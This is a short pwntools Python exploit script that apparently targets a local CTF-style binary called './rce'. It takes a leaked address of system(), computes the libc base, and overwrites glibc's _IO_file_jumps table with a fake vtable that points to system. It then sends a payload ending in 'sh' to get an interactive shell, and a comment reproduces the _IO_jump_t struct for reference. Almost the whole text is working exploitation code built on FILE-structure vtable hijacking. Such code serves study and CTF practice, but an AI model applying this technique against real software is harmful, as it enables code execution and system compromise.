#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

"""
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
"""
def rce():
    padding = p64(0) * 3 + p64(0x1e1)
    return padding + b'sh\x00'

r = process('./rce', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"}, aslr=False)
payload = rce()
r.recvuntil('GIFT: ')

system = int(r.recvline()[:-1], 16)
libc = system - 0x48850
_IO_file_jumps = libc + 0x1be4a0

fake_vtable = p64(system) * 0x10
r.sendlineafter('addr: ', str(_IO_file_jumps))
r.sendafter('value: ', fake_vtable)
sleep(1)
payload = rce()

gdb.attach(r)
r.send(payload)
r.interactive()
